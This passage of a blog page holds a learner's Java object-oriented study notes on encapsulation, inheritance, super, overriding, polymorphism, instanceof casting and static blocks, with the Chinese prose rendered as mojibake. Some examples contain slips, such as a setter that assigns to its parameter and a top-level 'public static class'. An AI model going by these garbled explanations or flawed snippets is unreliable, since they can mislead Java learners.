class="type">char</span> sex;<span class="comment">//æ€§åˆ«</span></span><br><span class="line">    <span class="keyword">private</span>  <span class="type">int</span> age;<span class="comment">//å¹´é¾„</span></span><br><span class="line">    <span class="comment">//æä¾›ä¸€äº›å¯ä»¥æ“ä½œè¿™ä¸ªå±æ€§çš„æ–¹æ³•ï¼</span></span><br><span class="line">    <span class="comment">//å¬è¿‡ä¸€äº›publicçš„ä¸€äº›get/setçš„æ–¹æ³•</span></span><br><span class="line">    <span class="comment">//getè·å¾—è¿™ä¸ªæ•°æ®</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//set ç»™è¿™ä¸ªæ•°æ®è®¾ç½®å€¼</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">char</span> sex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (age&gt;<span class="number">12</span>&amp;&amp;age&lt;<span class="number">24</span>)&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            age=<span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.Demo04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.oop.Demo04.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Student s1=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        s1.setName(<span class="string">&quot;æœé¡º&quot;</span>);</span><br><span class="line">        s1.setAge(<span class="number">33</span>);</span><br><span class="line">        System.out.println(s1.getAge(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°è£…çš„æ„ä¹‰ï¼š</p><p>1.æé«˜ç¨‹åºçš„å®‰å…¨æ€§ï¼Œä¿æŠ¤æ•°æ®</p><p>2.éšè—ä»£ç çš„å®ç°ç»†èŠ‚</p><p>3.ç»Ÿä¸€æ¥å£</p><p>4.ç³»ç»Ÿäº†ç»´æŠ¤å¢åŠ äº†</p><h4 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h4><p>ç»§æ‰¿çš„æœ¬è´¨æ˜¯å¯¹æŸä¸€æ‰¹ç±»çš„æŠ½è±¡ï¼Œä»è€Œå®ç°å¯¹ç°å®ä¸–ç•Œæ›´å¥½çš„å»ºæ¨¡ã€‚<br>extandsçš„æ„æ€æ˜¯â€œæ‰©å±•â€ã€‚å­ç±»æ˜¯çˆ¶ç±»çš„æ‰©å±•ã€‚<br>JAVAä¸­ç±»åªæœ‰å•ç»§æ‰¿ï¼Œæ²¡æœ‰å¤šç»§æ‰¿!<br>ç»§æ‰¿æ˜¯ç±»å’Œç±»ä¹‹é—´çš„ä¸€ç§å…³ç³»ã€‚é™¤æ­¤ä¹‹å¤–,ç±»å’Œç±»ä¹‹é—´çš„å…³ç³»è¿˜æœ‰ä¾èµ–ã€ç»„åˆã€èšåˆç­‰ã€‚<br>ç»§æ‰¿å…³ç³»çš„ä¿©ä¸ªç±»ï¼Œä¸€ä¸ªä¸ºå­ç±»(æ´¾ç”Ÿç±»),ä¸€ä¸ªä¸ºçˆ¶ç±»(åŸºç±»)ã€‚å­ç±»ç»§æ‰¿çˆ¶ç±»,ä½¿ç”¨å…³é”®å­—extendsæ¥è¡¨ç¤ºã€‚å­ç±»å’Œçˆ¶ç±»ä¹‹é—´,ä»æ„ä¹‰ä¸Šè®²åº”è¯¥å…·æœ‰â€is aâ€çš„å…³ç³».<br>objectç±»<br>super</p><p>æ–¹æ³•é‡å†™</p><p>####Superè¯¦è§£</p><p>application</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.oop.Demo05.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.test(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>student</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//å­ç±»</span></span><br><span class="line"><span class="comment">//ç»§æ‰¿äº†çˆ¶ç±»ï¼Œå°±ä¼šæ‹¥æœ‰çˆ¶ç±»çš„å…¨éƒ¨æ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name=<span class="string">&quot;qingchu&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(String name)</span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(name);<span class="comment">//11</span></span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name);<span class="comment">//qingchu</span></span><br><span class="line">        System.out.println(<span class="built_in">super</span>.name);<span class="comment">//qingchuan</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>person</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//çˆ¶ç±»</span></span><br><span class="line"><span class="comment">//åœ¨Javaä¸­ï¼Œæ‰€æœ‰çš„ç±»éƒ½ç›´æ¥æˆ–è€…é—´æ¥ç»§æ‰¿objectç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span>   String name=<span class="string">&quot;qingchuan&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>superæ³¨æ„ç‚¹:</p><ol><li>superè°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œå¿…é¡»åœ¨æ„é€ æ–¹æ³•çš„ç¬¬ä¸€ä¸ª2. super å¿…é¡»åªèƒ½å‡ºç°åœ¨å­ç±»çš„æ–¹æ³•æˆ–è€…æ„é€ æ–¹æ³•ä¸­!3. superå’Œ this ä¸èƒ½åŒæ—¶è°ƒç”¨æ„é€ æ–¹æ³•!<br>vs this:<br>ä»£è¡¨çš„å¯¹è±¡ä¸åŒ:<br>this:æœ¬èº«è°ƒç”¨è€…è¿™ä¸ªå¯¹è±¡super:ä»£è¡¨çˆ¶ç±»å¯¹è±¡çš„åº”ç”¨å‰æ<br>this:æ²¡å“Ÿç»§æ‰¿ä¹Ÿå¯ä»¥ä½¿ç”¨<br>super:åªèƒ½åœ¨ç»§æ‰¿æ¡ä»¶æ‰å¯ä»¥ä½¿ç”¨æ„é€ æ–¹æ³•<br>this() ;æœ¬ç±»çš„æ„é€ super():çˆ¶ç±»çš„æ„é€ !</li></ol><h4 id="æ–¹æ³•é‡å†™ï¼ˆå­çˆ¶ç±»ä¹‹é—´ï¼‰"><a href="#æ–¹æ³•é‡å†™ï¼ˆå­çˆ¶ç±»ä¹‹é—´ï¼‰" class="headerlink" title="æ–¹æ³•é‡å†™ï¼ˆå­çˆ¶ç±»ä¹‹é—´ï¼‰"></a>æ–¹æ³•é‡å†™ï¼ˆå­çˆ¶ç±»ä¹‹é—´ï¼‰</h4><p>é™æ€çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.oop.Demo05.A;</span><br><span class="line"><span class="keyword">import</span> com.oop.Demo05.B;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//æ–¹æ³•çš„è°ƒç”¨ä¹‹å’Œå·¦è¾¹ï¼Œå®šä¹‰çš„æ•°æ®ç±»å‹</span></span><br><span class="line">        <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        a.test();<span class="comment">//A</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//çˆ¶ç±»çš„å¼•ç”¨æŒ‡å‘äº†å­ç±»</span></span><br><span class="line">        B b=<span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        b.test();<span class="comment">//B</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//ç»§æ‰¿</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_">B</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;A=&gt;test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//é‡å†™æ˜¯æ–¹æ³•çš„é‡å†™ï¼Œä¸å±æ€§æ— å…³</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;B=&gt;test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>éé™æ€</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.oop.Demo05.A;</span><br><span class="line"><span class="keyword">import</span> com.oop.Demo05.B;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//æ–¹æ³•çš„è°ƒç”¨ä¹‹å’Œå·¦è¾¹ï¼Œå®šä¹‰çš„æ•°æ®ç±»å‹</span></span><br><span class="line">        <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        a.test();<span class="comment">//A</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//çˆ¶ç±»çš„å¼•ç”¨æŒ‡å‘äº†å­ç±»</span></span><br><span class="line">        B b=<span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        b.test();<span class="comment">//B</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//ç»§æ‰¿</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_">B</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span><span class="comment">//é‡å†™   æ³¨è§£ï¼šæœ‰åŠŸèƒ½çš„æ³¨é‡Š</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;A=&gt;test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//é‡å†™æ˜¯æ–¹æ³•çš„é‡å†™ï¼Œä¸å±æ€§æ— å…³</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;B=&gt;test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‡å†™:éœ€è¦æœ‰ç»§æ‰¿å…³ç³»ï¼Œå­ç±»é‡å†™çˆ¶ç±»çš„æ–¹æ³•!<br>1ï¼æ–¹æ³•åå¿…é¡»ç›¸åŒ<br>2. å‚æ•°åˆ—è¡¨åˆ—è¡¨å¿…é¡»ç›¸åŒ<br>3ï¼ä¿®é¥°ç¬¦:èŒƒå›´å¯ä»¥æ‰©å¤§ä½†ä¸èƒ½ç¼©å°:public&gt;Protected&gt;Default&gt;private<br>4ï¼æŠ›å‡ºçš„å¼‚å¸¸:èŒƒå›´ï¼Œå¯ä»¥è¢«ç¼©å°ï¼Œä½†ä¸èƒ½æ‰©å¤§: classNotFoundException â€“&gt; Exception(å¤§)<br>é‡å†™ï¼Œå­ç±»çš„æ–¹æ³•å’Œçˆ¶ç±»å¿…è¦ä¸€è‡´:;æ–¹æ³•ä½“ä¸åŒ!<br>ä¸ºä»€ä¹ˆéœ€è¦é‡å†™:<br>1.çˆ¶ç±»çš„åŠŸèƒ½ï¼Œå­ç±»ä¸ä¸€å®šéœ€è¦ï¼Œæˆ–è€…ä¸ä¸€å®šæ»¡è¶³!</p><h4 id="å¤šæ€"><a href="#å¤šæ€" class="headerlink" title="å¤šæ€"></a>å¤šæ€</h4><p>å³åŒä¸€ä¸ªæ–¹æ³•å¯ä»¥æ ¹æ®å‘é€å¯¹è±¡çš„ä¸åŒè€Œé‡‡ç”¨ä¸åŒçš„è¡Œä¸ºæ–¹å¼</p><p>ä¸€ä¸ªå¯¹è±¡çš„å®é™…ç±»å‹æ˜¯ç¡®å®šçš„ï¼Œä½†å¯ä»¥æŒ‡å‘å¯¹è±¡çš„å¼•ç”¨ç±»å‹æœ‰å¾ˆå¤š</p><p>å¤šæ€å­˜åœ¨çš„æ¡ä»¶ï¼š</p><p>æœ‰ç»§æ‰¿å…³ç³»</p><p>å­ç±»é‡å†™çˆ¶ç±»æ–¹æ³•</p><p>çˆ¶ç±»å¼•ç”¨æŒ‡å‘å­ç±»çš„å¯¹è±¡</p><p>å­ç±»é‡å†™äº†çˆ¶ç±»çš„æ–¹æ³•ï¼Œè¾“å‡ºçˆ¶ç±»</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829165142028.png"></p><p>å­ç±»çš„setæ–¹æ³•ï¼Œçˆ¶ç±»å´æ²¡æ³•è°ƒç”¨</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829165424266.png"></p><p>å¯¹è±¡èƒ½æ‰§è¡Œé‚£äº›æ–¹æ³•ï¼Œè¦çœ‹å¯¹è±¡å·¦è¾¹çš„ç±»å‹ï¼Œå³è¾¹å…³ç³»ä¸å¤§</p><p>Studentèƒ½è°ƒç”¨çš„æ–¹æ³•ï¼Œåªèƒ½æ˜¯è‡ªå·±çš„æˆ–è€…ç»§æ‰¿æ¥çš„</p><p>çˆ¶ç±»Personå‘¢ï¼Œå¯ä»¥è°ƒç”¨è‡ªå·±çš„æ–¹æ³•ï¼Œæ²¡æ³•è°ƒç”¨å­ç±»ç‹¬æœ‰çš„æ–¹æ³•</p><p>å¼ºåˆ¶ç±»å‹è½¬æ¢</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829170805535.png"></p><p>æ³¨æ„ï¼š1.å¤šæ€æ˜¯æ–¹æ³•çš„å¤šæ€ï¼Œå±æ€§æ²¡æœ‰å¤šæ€æ€§</p><p>2.çˆ¶ç±»å’Œå­ç±»ï¼šæœ‰è”ç³»ï¼Œç±»å‹è½¬æ¢å¼‚å¸¸ ClaCastExeption</p><p>3.å­˜åœ¨æ¡ä»¶ï¼šç»§æ‰¿å…³ç³»ï¼Œæ–¹æ³•éœ€è¦é‡å†™ï¼Œçˆ¶ç±»å¼•ç”¨æŒ‡å‘å­ç±»å¯¹è±¡  fatherå‘ &#x3D;new son()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package com.oop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import com.oop.Demo06.Person;</span><br><span class="line">import com.oop.Demo06.Student;</span><br><span class="line">import com.oop.Demo06.teacher;</span><br><span class="line"></span><br><span class="line">public class Application &#123;</span><br><span class="line">    public static   void main(String[] args) &#123;</span><br><span class="line">        //object&gt;String</span><br><span class="line">        //object&gt;person&gt;teacher</span><br><span class="line">        //object&gt;person&gt;student</span><br><span class="line"></span><br><span class="line">     Object a1 = new Student();</span><br><span class="line"></span><br><span class="line">        System.out.println(a1 instanceof Student);</span><br><span class="line">        System.out.println(a1 instanceof Person);</span><br><span class="line">        System.out.println(a1 instanceof Object);</span><br><span class="line">        System.out.println(a1 instanceof String);</span><br><span class="line">        System.out.println(a1 instanceof teacher);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸èƒ½é‡å†™ï¼šstatic æ–¹æ³• å±äºç±» ä¸èƒ½å®ä¾‹</p><p>final å¸¸é‡</p><p>private ç§æœ‰</p><p>instanceof</p><h4 id="instance-ofå’Œç±»å‹è½¬æ¢"><a href="#instance-ofå’Œç±»å‹è½¬æ¢" class="headerlink" title="instance ofå’Œç±»å‹è½¬æ¢"></a>instance ofå’Œç±»å‹è½¬æ¢</h4><p>instance ofå¯ä»¥åˆ¤æ–­ä¸¤ä¸ªç±»æ˜¯å¦å­˜åœ¨çˆ¶å­å…³ç³»</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829172015598.png"></p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829172723738.png"></p><p>()+è¦è½¬çš„å¯¹è±¡ï¼Œalt+å›è½¦  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">obj</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        Student student= (Student) obj;</span><br><span class="line">        student.go();</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä½è½¬é«˜çš„ç±»å‹ï¼Œè½¬æ¢æ²¡æœ‰å¤§é—®é¢˜ï¼Œå­ç±»å‘çˆ¶ç±»è½¬æ¢ï¼Œå‘ä¸Šè½¬å‹</p><p>é«˜è½¬ä½</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Student student= <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.go();</span><br><span class="line">        Person person=student;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çˆ¶ç±»è½¬å­ç±»ä¼šä¸¢å¤±ä¸€éƒ¨åˆ†ä¸œè¥¿ï¼Œå¼ºåˆ¶è½¬æ¢</p><p>çˆ¶ç±»å¼•ç”¨æŒ‡å‘å­ç±»å¯¹è±¡ï¼šå‘ä¸Šè½¬å‹ éšå¼è½¬æ¢ å¯èƒ½ä¼šä¸¢å¤±å­ç±»ç‰¹æœ‰çš„æ–¹æ³• çˆ¶ç±»å¼•ç”¨çš„å˜é‡æ— æ³•ä½¿ç”¨å­ç±»ç‰¹æœ‰çš„æ–¹æ³• å¦‚æœçˆ¶ç±»å¼•ç”¨å˜é‡éœ€è¦ä½¿ç”¨å­ç±»ç‰¹æœ‰çš„æ–¹æ³•ï¼Œæ­¤æ—¶éœ€è¦å°†è¯¥çˆ¶ç±»å¼•ç”¨å˜é‡æ˜¾ç¤ºè½¬æ¢ä¸ºå­ç±»å¼•ç”¨</p><h4 id="staticè¯¦è§£"><a href="#staticè¯¦è§£" class="headerlink" title="staticè¯¦è§£"></a>staticè¯¦è§£</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">//ä»£ç å—ï¼ˆåŒ¿åä»£ç å—ï¼‰åˆ›å»ºå¯¹è±¡æ—¶å°±ç”Ÿæˆï¼Œå¯¹è±¡ç”Ÿæˆä¸€æ¬¡å°±åŠ è½½ä¸€æ¬¡</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static&#123;</span><br><span class="line">//é™æ€ä»£ç å—ï¼ˆåŒ¿åä»£ç å—ï¼‰æ ¹ç±»ä¸€å—åŠ è½½ï¼Œå°±åŠ è½½ä¸€æ¬¡ï¼Œæ°¸ä¹…å­˜åœ¨</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">package com.oop.Demo07;</span><br><span class="line"></span><br><span class="line">public class demo01 